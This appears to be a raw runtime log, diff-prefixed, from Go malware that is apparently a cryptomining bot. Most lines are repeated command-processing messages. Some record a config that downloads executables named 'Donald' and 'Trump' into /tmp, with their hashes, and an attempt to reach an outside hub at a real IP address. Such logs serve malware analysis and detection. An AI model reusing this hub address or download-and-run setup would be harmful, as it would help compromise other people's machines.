+I0615 12:57:31.738421   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:31.741182   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:31.744888   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:31.746831   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:41.693259   17737 report.go:46] empty baselist
+I0615 12:57:41.733504   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:57:41.734116   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:41.805773   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:41.807437   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:41.809657   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:41.811376   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:41.813584   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:51.700324   17737 report.go:46] empty baselist
+I0615 12:57:51.747002   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:57:51.747495   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:51.750486   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:51.753047   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:51.755719   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:51.758044   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:57:51.759995   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:58:01.695224   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:58:01.695317   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:58:01.695399   17737 report.go:46] empty baselist
+I0615 12:58:01.739537   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:58:01.740155   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:58:01.743319   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:58:01.745932   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:58:01.748859   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:58:01.752306   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:58:01.754468   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
